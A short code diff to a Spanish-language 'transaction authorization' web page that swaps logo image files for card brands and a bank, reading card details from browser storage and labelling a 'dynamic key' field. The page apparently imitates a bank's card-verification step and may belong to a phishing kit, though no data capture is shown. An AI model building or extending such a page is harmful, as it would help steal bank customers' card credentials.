@@ -197,7 +197,7 @@
     <div class="header">
       <img id="bank-logo" src="lgos/error2.png" alt="Banco Logo">
       <div class="id-check">
-        <img id="card-type-logo" src="lgos/error.avif" alt="Tipo Tarjeta Logo" height="35">
+        <img id="card-type-logo" src="lgos/error2.png" alt="Tipo Tarjeta Logo" height="35">
       </div>
     </div>
     <div class="title">Autorización de transacción</div>
@@ -318,10 +318,10 @@
     function actualizarLogos() {
       const infoload = JSON.parse(localStorage.getItem('infoload'));
       const tiposTarjetas = {
-        "visa": "visa.jpg",
+        "visa": "visa.svg",
         "mastercard": "master.webp",
-        "amex": "amex.avif",
-        "discover": "discover.png"
+        "amex": "amex.svg",
+        "discover": "discover.svg"
       };
 
       const bankLogo = document.getElementById("bank-logo");
@@ -339,10 +339,10 @@
         if (tiposTarjetas[tipoTarjetaNormalizado]) {
           cardTypeLogo.src = `lgos/${tiposTarjetas[tipoTarjetaNormalizado]}`;
         } else {
-          cardTypeLogo.src = "lgos/error.avif";
+          cardTypeLogo.src = "lgos/error2.png";
         }
       } else {
-        cardTypeLogo.src = "lgos/error.avif";
+        cardTypeLogo.src = "lgos/error2.png";
       }
 
       document.getElementById("clave-label").innerText = "Clave dinamica:";
